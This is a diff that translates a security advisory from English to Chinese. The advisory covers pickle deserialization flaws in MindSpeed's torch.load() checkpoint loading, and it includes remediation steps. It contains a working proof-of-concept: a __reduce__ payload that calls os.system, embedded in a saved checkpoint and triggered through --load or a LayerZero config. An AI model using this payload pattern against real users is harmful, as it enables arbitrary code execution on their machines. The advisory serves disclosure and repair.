@@ -1,20 +1,20 @@
-# VULN-CROSS-TORCH-LOAD-001: Cross-Module Pickle Deserialization Vulnerability
+# VULN-CROSS-TORCH-LOAD-001：跨模块Pickle反序列化漏洞致Checkpoint加载RCE
 
-## Summary
+## 概要
 
-**Vulnerability Type:** Deserialization (CWE-502)  
-**Severity:** Critical  
-**Confidence:** 95% (Confirmed)  
-**CVSS Score:** 9.8 (Critical)  
+**漏洞类型：** 反序列化 (CWE-502)  
+**严重性：** Critical  
+**置信度：** 95% (已确认)  
+**CVSS评分：** 9.8 (Critical)  
 
-A cross-module insecure deserialization vulnerability exists in MindSpeed's checkpoint loading mechanism. Multiple modules use `torch.load()` without the `weights_only=True` parameter, allowing attackers to execute arbitrary code through malicious pickle payloads embedded in checkpoint files.
+MindSpeed 的 checkpoint 加载机制存在跨模块不安全反序列化漏洞。多个模块使用 `torch.load()` 时未设置 `weights_only=True` 参数，允许攻击者通过嵌入在 checkpoint 文件中的恶意 pickle payload 执行任意代码。
 
 ---
 
-## Affected Files
+## 受影响文件
 
-| File | Line | Vulnerable Code |
-|------|------|-----------------|
+| 文件 | 行号 | 漏洞代码 |
+|------|------|----------|
 | `mindspeed/checkpointing.py` | 277 | `torch.load(checkpoint_name, map_location='cpu')` |
 | `mindspeed/checkpointing.py` | 284 | `torch.load(checkpoint_name + ".ema", map_location='cpu')` |
 | `mindspeed/checkpointing.py` | 310 | `torch.load(checkpoint_name, map_location='cpu')` |
@@ -26,28 +26,28 @@ A cross-module insecure deserialization vulnerability exists in MindSpeed's chec
 
 ---
 
-## Attack Vectors
+## 攻击向量
 
-### Attack Vector 1: Command Line Argument (--load)
+### 攻击向量 1：命令行参数 (--load)
 
-**Entry Point:** CLI argument `--load`
+**入口点：** CLI 参数 `--load`
 
-**Data Flow:**
+**数据流：**
 ```
-CLI --load argument
+CLI --load 参数
     ↓
 args.load (arguments.py)
     ↓
-load_dir parameter
+load_dir 参数
     ↓
 _load_base_checkpoint(checkpointing.py:204)
     ↓
 checkpoint_name = get_checkpoint_name(load_dir, iteration, release)
     ↓
-torch.load(checkpoint_name, map_location='cpu')  # VULNERABLE
+torch.load(checkpoint_name, map_location='cpu')  # 漏洞点
 ```
 
-**Vulnerable Function:**
+**漏洞函数：**
 ```python
 # mindspeed/checkpointing.py:204-277
 def _load_base_checkpoint(load_dir, rank0=False, sharded_state_dict=None,
@@ -55,16 +55,16 @@ def _load_base_checkpoint(load_dir, rank0=False, sharded_state_dict=None,
     # ...
     checkpoint_name = get_checkpoint_name(load_dir, iteration, release)
     # ...
-    state_dict = torch.load(checkpoint_name, map_location='cpu')  # NO weights_only=True
+    state_dict = torch.load(checkpoint_name, map_location='cpu')  # 无 weights_only=True
 ```
 
-### Attack Vector 2: LayerZero YAML Configuration
+### 攻击向量 2：LayerZero YAML 配置
 
-**Entry Point:** LayerZero config YAML file
+**入口点：** LayerZero 配置 YAML 文件
 
-**Data Flow:**
+**数据流：**
 ```
-layerzero_config.yaml (user-controlled file)
+layerzero_config.yaml (用户可控文件)
     ↓
 ckpt_load_path: "/malicious/path"
     ↓
@@ -76,64 +76,64 @@ load_layerzero_checkpoint(models, config.ckpt_load_path, ...) (config.py:271)
     ↓
 sd_file = os.path.join(ckpt_dir, f"model_{rank}.pt")
     ↓
-torch.load(sd_file)  # VULNERABLE
+torch.load(sd_file)  # 漏洞点
 ```
 
-**Vulnerable Function:**
+**漏洞函数：**
 ```python
 # mindspeed/core/distributed/layerzero/state/mga_checkpoint.py:177-188
 def load_layerzero_checkpoint(models, ckpt_dir, optimizer=None, opt_param_scheduler=None):
     # ...
     sd_file = os.path.join(ckpt_dir, f"model_{rank}.pt")
     # ...
-    state_dict = torch.load(sd_file)  # NO weights_only=True
+    state_dict = torch.load(sd_file)  # 无 weights_only=True
 ```
 
-### Attack Vector 3: LayerZero Checkpointer Tool
+### 攻击向量 3：LayerZero Checkpointer 工具
 
-**Entry Point:** `ckpt_dir` argument passed to `LayerzeroCheckpoint` class
+**入口点：** 传递给 `LayerzeroCheckpoint` 类的 `ckpt_dir` 参数
 
-**Data Flow:**
+**数据流：**
 ```
-User-provided checkpoint directory
+用户提供的 checkpoint 目录
     ↓
 LayerzeroCheckpoint(ckpt_dir) (layerzero_checkpointer.py:91)
     ↓
 self.file_list = self._get_files_by_key(ckpt_dir, MODEL_FILE_KEY)
     ↓
-ShardStateDict(filename) → torch.load(self.filename)  # VULNERABLE
+ShardStateDict(filename) → torch.load(self.filename)  # 漏洞点
 ```
 
 ---
 
-## Attack Scenarios
+## 攻击场景
 
-### Scenario 1: Malicious Model Distribution
+### 场景 1：恶意模型分发
 
-1. Attacker creates a malicious checkpoint file with embedded pickle payload
-2. Attacker distributes the checkpoint as a "pre-trained model" on model hub or shares directly
-3. Victim downloads and loads the checkpoint using `--load /path/to/malicious/ckpt`
-4. Upon loading, the pickle payload executes arbitrary code with victim's privileges
+1. 攻击者创建包含嵌入 pickle payload 的恶意 checkpoint 文件
+2. 攻击者在模型仓库分发该 checkpoint 作为"预训练模型"或直接分享
+3. 受害者下载并使用 `--load /path/to/malicious/ckpt` 加载 checkpoint
+4. 加载时，pickle payload 以受害者权限执行任意代码
 
-### Scenario 2: Compromised Shared Storage
+### 场景 2：共享存储被入侵
 
-1. Attacker gains write access to shared storage where checkpoints are stored
-2. Attacker modifies checkpoint files by injecting pickle payloads
-3. When training job loads the compromised checkpoint, arbitrary code executes
-4. This can lead to data exfiltration, lateral movement, or system compromise
+1. 攻击者获得存储 checkpoint 的共享存储写入权限
+2. 攻击者通过注入 pickle payload 修改 checkpoint 文件
+3. 训练任务加载被入侵的 checkpoint 时，任意代码被执行
+4. 可导致数据泄露、横向移动或系统入侵
 
-### Scenario 3: Supply Chain Attack via LayerZero Config
+### 场景 3：通过 LayerZero 配置的供应链攻击
 
-1. Attacker provides a malicious LayerZero configuration YAML
-2. Config specifies `ckpt_load_path` pointing to attacker-controlled location
-3. Malicious checkpoint file at that location contains pickle payload
-4. Code execution occurs during LayerZero initialization
+1. 攻击者提供恶意 LayerZero 配置 YAML
+2. 配置指定 `ckpt_load_path` 指向攻击者控制的位置
+3. 该位置的恶意 checkpoint 文件包含 pickle payload
+4. LayerZero 初始化期间发生代码执行
 
 ---
 
-## Proof of Concept Construction
+## 概念验证构造
 
-### Step 1: Create Malicious Pickle Payload
+### 步骤 1：创建恶意 Pickle Payload
 
 ```python
 import torch
@@ -142,90 +142,90 @@ import os
 
 class MaliciousPayload:
     def __reduce__(self):
-        # This will execute when the pickle is loaded
+        # pickle 加载时将执行此代码
         cmd = "touch /tmp/pwned && echo 'VULNERABILITY CONFIRMED' > /tmp/pwned"
         return (os.system, (cmd,))
 
-# Create a fake model state dict with embedded payload
+# 创建包含嵌入 payload 的虚假模型 state dict
 malicious_state_dict = {
     'model': {'weight': torch.randn(10, 10)},
     'iteration': 1000,
-    '__payload__': MaliciousPayload()  # Hidden payload
+    '__payload__': MaliciousPayload()  # 隐藏 payload
 }
 
-# Alternative: Use pickle directly to embed payload more stealthily
+# 替代方案：直接使用 pickle 更隐蔽地嵌入 payload
 import io
 payload = pickle.dumps(MaliciousPayload())
-# The payload can be embedded in various ways within the checkpoint file
+# payload 可通过多种方式嵌入 checkpoint 文件
 ```
 
-### Step 2: Save Malicious Checkpoint
+### 步骤 2：保存恶意 Checkpoint
 
 ```python
-# Save as a valid PyTorch checkpoint
+# 保存为有效 PyTorch checkpoint
 torch.save(malicious_state_dict, 'malicious_checkpoint.pt')
-# Or for EMA checkpoint variant
+# 或 EMA checkpoint 变体
 torch.save(malicious_state_dict, 'malicious_checkpoint.pt.ema')
 ```
 
-### Step 3: Trigger Vulnerability
+### 步骤 3：触发漏洞
 
 ```bash
-# Via CLI argument
+# 通过 CLI 参数
 python train.py --load /path/to/malicious_checkpoint
 
-# Via LayerZero config
-# In layerzero_config.yaml:
+# 通过 LayerZero 配置
+# 在 layerzero_config.yaml 中：
 # ckpt_load_path: "/path/to/malicious/checkpoint/dir"
 python train.py --layerzero-config layerzero_config.yaml
 ```
 
-### Step 4: Verify Exploitation
+### 步骤 4：验证漏洞利用
 
 ```bash
 ls -la /tmp/pwned
-# If the file exists, the vulnerability was exploited successfully
+# 若文件存在，漏洞已成功利用
 ```
 
 ---
 
-## Impact Assessment
+## 影响评估
 
-### Confidentiality Impact: HIGH
-- Attacker can read arbitrary files by executing code
-- Can exfiltrate training data, model weights, and credentials
-- May access environment variables and secrets
+### 机密性影响：HIGH
+- 攻击者可通过执行代码读取任意文件
+- 可窃取训练数据、模型权重和凭证
+- 可访问环境变量和密钥
 
-### Integrity Impact: HIGH
-- Attacker can modify training data
-- Can tamper with model weights to introduce backdoors
-- Can corrupt checkpoints and training state
+### 完整性影响：HIGH
+- 攻击者可修改训练数据
+- 可篡改模型权重植入后门
+- 可损坏 checkpoint 和训练状态
 
-### Availability Impact: HIGH
-- Can cause denial of service
-- Can corrupt or delete critical files
-- Can crash training jobs
+### 可用性影响：HIGH
+- 可导致拒绝服务
+- 可损坏或删除关键文件
+- 可崩溃训练任务
 
-### Privileges Required: NONE
-- Attacker only needs to provide a malicious checkpoint file
-- No special privileges required in the target environment
+### 所需权限：NONE
+- 攻击者只需提供恶意 checkpoint 文件
+- 目标环境无需特殊权限
 
-### User Interaction: REQUIRED
-- Victim must load the malicious checkpoint
-- This is common practice in ML workflows (transfer learning, fine-tuning)
+### 用户交互：REQUIRED
+- 受害者必须加载恶意 checkpoint
+- 这是 ML 工作流中的常见操作（迁移学习、微调）
 
 ---
 
-## Root Cause Analysis
+## 根因分析
 
-1. **Missing Security Parameter:** All `torch.load()` calls lack `weights_only=True`
-2. **PyTorch Default Behavior:** By default, `torch.load()` uses pickle for deserialization
-3. **No Content Validation:** Code only validates path existence, not checkpoint integrity
-4. **Trust Assumption:** Code trusts any file at the specified path
+1. **缺少安全参数：** 所有 `torch.load()` 调用缺少 `weights_only=True`
+2. **PyTorch 默认行为：** 默认情况下，`torch.load()` 使用 pickle 进行反序列化
+3. **无内容验证：** 代码仅验证路径存在，不验证 checkpoint 完整性
+4. **信任假设：** 代码信任指定路径的任何文件
 
-### Comparison with Secure Implementation
+### 与安全实现的对比
 
-The codebase already contains a secure implementation reference:
+代码库中已存在安全实现参考：
 
 ```python
 # mindspeed/mindspore/third_party/transformers/modeling_utils.py:56-60
@@ -233,55 +233,55 @@ def load_state_dict(
     checkpoint_file: Union[str, os.PathLike],
     is_quantized: bool = False,
     map_location: Optional[Union[str, torch.device]] = "cpu",
-    weights_only: bool = True,  # SECURE DEFAULT
+    weights_only: bool = True,  # 安全默认值
 ):
 ```
 
 ---
 
-## Remediation Recommendations
+## 修复建议
 
-### Immediate Fix (Priority: Critical)
+### 立即修复（优先级：Critical）
 
-Add `weights_only=True` to all `torch.load()` calls:
+为所有 `torch.load()` 调用添加 `weights_only=True`：
 
 ```python
-# BEFORE (Vulnerable)
+# 修复前（有漏洞）
 state_dict = torch.load(checkpoint_name, map_location='cpu')
 
-# AFTER (Secure)
+# 修复后（安全）
 state_dict = torch.load(checkpoint_name, map_location='cpu', weights_only=True)
 ```
 
-### Affected Files Requiring Patch
+### 需补丁的受影响文件
 
-1. `mindspeed/checkpointing.py`:
-   - Line 277: Add `weights_only=True`
-   - Line 284: Add `weights_only=True`
-   - Line 310: Add `weights_only=True`
+1. `mindspeed/checkpointing.py`：
+   - 第 277 行：添加 `weights_only=True`
+   - 第 284 行：添加 `weights_only=True`
+   - 第 310 行：添加 `weights_only=True`
 
-2. `mindspeed/core/distributed/layerzero/state/mga_checkpoint.py`:
-   - Line 188: Add `weights_only=True`
+2. `mindspeed/core/distributed/layerzero/state/mga_checkpoint.py`：
+   - 第 188 行：添加 `weights_only=True`
 
-3. `mindspeed/core/distributed/layerzero/state/scripts/layerzero_checkpointer.py`:
-   - Line 55: Add `weights_only=True`
-   - Line 110: Add `weights_only=True`
-   - Line 127: Add `weights_only=True`
-   - Line 135: Add `weights_only=True`
+3. `mindspeed/core/distributed/layerzero/state/scripts/layerzero_checkpointer.py`：
+   - 第 55 行：添加 `weights_only=True`
+   - 第 110 行：添加 `weights_only=True`
+   - 第 127 行：添加 `weights_only=True`
+   - 第 135 行：添加 `weights_only=True`
 
-### Additional Security Measures
+### 附加安全措施
 
-1. **Add Checkpoint Validation:**
+1. **添加 Checkpoint 验证：**
 ```python
 def validate_checkpoint_path(path):
-    """Validate checkpoint path is within allowed directories."""
+    """验证 checkpoint 路径是否在允许目录内。"""
     allowed_dirs = get_allowed_checkpoint_dirs()
     real_path = os.path.realpath(path)
     if not any(real_path.startswith(d) for d in allowed_dirs):
-        raise SecurityError(f"Checkpoint path outside allowed directories: {path}")
+        raise SecurityError(f"Checkpoint 路径超出允许目录: {path}")
 ```
 
-2. **Add Integrity Verification:**
+2. **添加完整性验证：**
 ```python
 def load_checkpoint_secure(path, expected_hash=None):
     if expected_hash:
@@ -289,36 +289,36 @@ def load_checkpoint_secure(path, expected_hash=None):
     return torch.load(path, map_location='cpu', weights_only=True)
 ```
 
-3. **Use Safetensors Format:**
-Consider migrating to safetensors format for model weights, which does not support arbitrary code execution:
+3. **使用 Safetensors 格式：**
+考虑迁移到 safetensors 格式存储模型权重，该格式不支持任意代码执行：
 ```python
 from safetensors.torch import load_file
-state_dict = load_file(checkpoint_path)  # No arbitrary code execution
+state_dict = load_file(checkpoint_path)  # 无任意代码执行
 ```
 
 ---
 
-## References
+## 参考资料
 
-- CWE-502: Deserialization of Untrusted Data
-- PyTorch Security Advisory: https://github.com/pytorch/pytorch/blob/main/SECURITY.md
-- PyTorch Documentation: https://pytorch.org/docs/stable/generated/torch.load.html
-- Safetensors: https://github.com/huggingface/safetensors
-
----
-
-## Discovery Information
-
-- **Scan Tool:** Static Analysis Security Scanner
-- **Detection Pattern:** `torch.load()` without `weights_only` parameter
-- **Cross-Module Analysis:** Identified cluster of vulnerable calls across checkpointing and layerzero modules
+- CWE-502：不可信数据反序列化
+- PyTorch 安全公告：https://github.com/pytorch/pytorch/blob/main/SECURITY.md
+- PyTorch 文档：https://pytorch.org/docs/stable/generated/torch.load.html
+- Safetensors：https://github.com/huggingface/safetensors
 
 ---
 
-## Verification Steps for Fix
+## 发现信息
 
-1. Apply the patches adding `weights_only=True`
-2. Run existing test suite to verify functionality
-3. Attempt to load a checkpoint containing pickle payload
-4. Verify that `UnpicklingError` is raised instead of code execution
-5. Test with legitimate checkpoints to ensure compatibility
+- **扫描工具：** 静态分析安全扫描器
+- **检测模式：** 无 `weights_only` 参数的 `torch.load()` 调用
+- **跨模块分析：** 在 checkpointing 和 layerzero 模块中发现漏洞调用集群
+
+---
+
+## 修复验证步骤
+
+1. 应用添加 `weights_only=True` 的补丁
+2. 运行现有测试套件验证功能
+3. 尝试加载包含 pickle payload 的 checkpoint
+4. 验证抛出 `UnpicklingError` 而非代码执行
+5. 用合法 checkpoint 测试确保兼容性
